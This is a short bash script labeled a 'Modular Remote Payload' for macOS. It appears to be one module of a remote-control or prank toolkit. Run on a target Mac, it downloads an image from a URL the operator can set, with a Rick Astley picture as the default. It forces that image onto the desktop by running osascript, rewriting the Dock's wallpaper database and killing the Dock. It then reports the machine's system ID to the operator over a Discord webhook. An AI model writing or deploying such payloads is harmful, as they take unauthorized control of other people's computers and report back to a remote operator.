#!/bin/bash
# ============================================================
# Wallpaper Changer for macOS - Modular Remote Payload
# ============================================================
# Changes desktop wallpaper
# Optional: $U for custom image URL
# ============================================================

SYSID=$(get_sysid)

# Default to Rick Astley if no URL provided
IMAGE_URL="${U:-https://i.imgur.com/5ftHsZe.jpeg}"
WALLPAPER="/tmp/wallpaper_$(date +%s).jpg"

# Download image
if curl -sL "$IMAGE_URL" -o "$WALLPAPER" 2>/dev/null && [[ -f "$WALLPAPER" ]]; then
    # Set wallpaper using osascript
    osascript -e "tell application \"Finder\" to set desktop picture to POSIX file \"$WALLPAPER\""
    
    # Alternative method using sqlite (for all spaces)
    sqlite3 ~/Library/Application\ Support/Dock/desktoppicture.db "UPDATE data SET value = '$WALLPAPER'" 2>/dev/null
    killall Dock 2>/dev/null
    
    send_discord "🖼️ **Wallpaper Changed on $SYSID**\nSource: \`$IMAGE_URL\`"
else
    send_discord "❌ Wallpaper change failed on $SYSID - Could not download image"
fi

